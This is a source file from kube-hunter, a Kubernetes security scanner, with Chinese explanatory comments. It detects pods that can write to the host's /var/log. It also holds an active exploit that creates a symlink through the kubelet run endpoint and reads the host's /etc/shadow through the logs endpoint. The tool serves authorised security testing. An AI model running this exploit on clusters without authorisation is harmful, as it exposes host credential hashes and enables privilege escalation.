# `.\kubehunter\kube_hunter\modules\hunting\mounts.py`

```

# 导入所需的模块
import logging  # 导入日志模块
import re  # 导入正则表达式模块
import uuid  # 导入UUID模块

from kube_hunter.conf import config  # 从kube_hunter.conf模块导入config配置
from kube_hunter.core.events import handler  # 从kube_hunter.core.events模块导入handler事件处理器
from kube_hunter.core.events.types import Event, Vulnerability  # 从kube_hunter.core.events.types模块导入Event和Vulnerability类
from kube_hunter.core.types import (  # 从kube_hunter.core.types模块导入ActiveHunter、Hunter、KubernetesCluster和PrivilegeEscalation类
    ActiveHunter,
    Hunter,
    KubernetesCluster,
    PrivilegeEscalation,
)
from kube_hunter.modules.hunting.kubelet import (  # 从kube_hunter.modules.hunting.kubelet模块导入ExposedPodsHandler、ExposedRunHandler和KubeletHandlers类
    ExposedPodsHandler,
    ExposedRunHandler,
    KubeletHandlers,
)

logger = logging.getLogger(__name__)  # 获取logger对象

# 定义一个Vulnerability类，表示一个Pod可以在主机的/var/log目录中创建符号链接，可能导致根目录遍历
class WriteMountToVarLog(Vulnerability, Event):
    """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traveral"""

    def __init__(self, pods):
        Vulnerability.__init__(
            self, KubernetesCluster, "Pod With Mount To /var/log", category=PrivilegeEscalation, vid="KHV047",
        )
        self.pods = pods
        self.evidence = "pods: {}".format(", ".join((pod["metadata"]["name"] for pod in self.pods)))

# 定义一个Vulnerability类，表示攻击者可以在具有对/var/log挂载的Pod上运行命令，并遍历主机文件系统上的所有文件
class DirectoryTraversalWithKubelet(Vulnerability, Event):
    """An attacker can run commands on pods with mount to /var/log,
    and traverse read all files on the host filesystem"""

    def __init__(self, output):
        Vulnerability.__init__(
            self, KubernetesCluster, "Root Traversal Read On The Kubelet", category=PrivilegeEscalation,
        )
        self.output = output
        self.evidence = "output: {}".format(self.output)

# 订阅ExposedPodsHandler事件的Hunter类，用于寻找具有对主机的/var/log目录具有写访问权限的Pod
@handler.subscribe(ExposedPodsHandler)
class VarLogMountHunter(Hunter):
    """Mount Hunter - /var/log
    Hunt pods that have write access to host's /var/log. in such case,
    the pod can traverse read files on the host machine
    """

    def __init__(self, event):
        self.event = event

    # 检查Pod数据中是否有对应的可写挂载
    def has_write_mount_to(self, pod_data, path):
        """Returns volume for correlated writable mount"""
        for volume in pod_data["spec"]["volumes"]:
            if "hostPath" in volume:
                if "Directory" in volume["hostPath"]["type"]:
                    if volume["hostPath"]["path"].startswith(path):
                        return volume

    # 执行查找具有对主机的/var/log目录具有写访问权限的Pod的操作
    def execute(self):
        pe_pods = []
        for pod in self.event.pods:
            if self.has_write_mount_to(pod, path="/var/log"):
                pe_pods.append(pod)
        if pe_pods:
            self.publish_event(WriteMountToVarLog(pods=pe_pods))

# 订阅ExposedRunHandler事件的ActiveHunter类，用于尝试在具有对/var/log挂载的Pod中运行命令来读取主机上的/etc/shadow文件
@handler.subscribe(ExposedRunHandler)
class ProveVarLogMount(ActiveHunter):
    """Prove /var/log Mount Hunter
    Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log
    """

    def __init__(self, event):
        self.event = event
        self.base_path = f"https://{self.event.host}:{self.event.port}"

    # 运行命令的方法
    def run(self, command, container):
        run_url = KubeletHandlers.RUN.value.format(
            podNamespace=container["namespace"], podID=container["pod"], containerName=container["name"], cmd=command,
        )
        return self.event.session.post(f"{self.base_path}/{run_url}", verify=False).text

    # 获取具有对主机的/var/log目录具有写访问权限的Pod的方法
    def get_varlog_mounters(self):
        logger.debug("accessing /pods manually on ProveVarLogMount")
        pods = self.event.session.get(
            f"{self.base_path}/" + KubeletHandlers.PODS.value, verify=False, timeout=config.network_timeout,
        ).json()["items"]
        for pod in pods:
            volume = VarLogMountHunter(ExposedPodsHandler(pods=pods)).has_write_mount_to(pod, "/var/log")
            if volume:
                yield pod, volume

    # 从挂载名获取挂载路径的方法
    def mount_path_from_mountname(self, pod, mount_name):
        """returns container name, and container mount path correlated to mount_name"""
        for container in pod["spec"]["containers"]:
            for volume_mount in container["volumeMounts"]:
                if volume_mount["name"] == mount_name:
                    logger.debug(f"yielding {container}")
                    yield container, volume_mount["mountPath"]

    # 遍历读取主机文件的方法
    def traverse_read(self, host_file, container, mount_path, host_path):
        """Returns content of file on the host, and cleans trails"""
        symlink_name = str(uuid.uuid4())
        # creating symlink to file
        self.run(f"ln -s {host_file} {mount_path}/{symlink_name}", container)
        # following symlink with kubelet
        path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(
            path=re.sub(r"^/var/log", "", host_path) + symlink_name
        )
        content = self.event.session.get(
            f"{self.base_path}/{path_in_logs_endpoint}", verify=False, timeout=config.network_timeout,
        ).text
        # removing symlink
        self.run(f"rm {mount_path}/{symlink_name}", container=container)
        return content

    # 执行具有对主机的/var/log目录具有写访问权限的Pod中运行命令来读取主机上的/etc/shadow文件的操作
    def execute(self):
        for pod, volume in self.get_varlog_mounters():
            for container, mount_path in self.mount_path_from_mountname(pod, volume["name"]):
                logger.debug("Correlated container to mount_name")
                cont = {
                    "name": container["name"],
                    "pod": pod["metadata"]["name"],
                    "namespace": pod["metadata"]["namespace"],
                }
                try:
                    output = self.traverse_read(
                        "/etc/shadow", container=cont, mount_path=mount_path, host_path=volume["hostPath"]["path"],
                    )
                    self.publish_event(DirectoryTraversalWithKubelet(output=output))
                except Exception:
                    logger.debug("Could not exploit /var/log", exc_info=True)

```